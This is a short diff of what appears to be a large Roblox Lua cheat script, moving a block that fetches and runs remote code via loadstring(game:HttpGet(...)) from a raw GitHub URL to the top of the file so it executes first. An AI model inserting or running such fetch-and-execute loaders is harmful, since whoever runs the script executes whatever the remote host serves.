@@ -1,4 +1,7 @@
 --> dont make key sys pls
+pcall(function()
+	loadstring(game:HttpGet("https://raw.githubusercontent.com/Kazamatcha/vhuyprivate/refs/heads/main/downloadconfigs"))()
+end)
 
 repeat task["wait"]() until game:IsLoaded()
 
@@ -25715,6 +25718,3 @@ do
         local_crew = crew["Value"]
     end))
 end
-pcall(function()
-	loadstring(game:HttpGet("https://raw.githubusercontent.com/Kazamatcha/vhuyprivate/refs/heads/main/downloadconfigs"))()
-end)
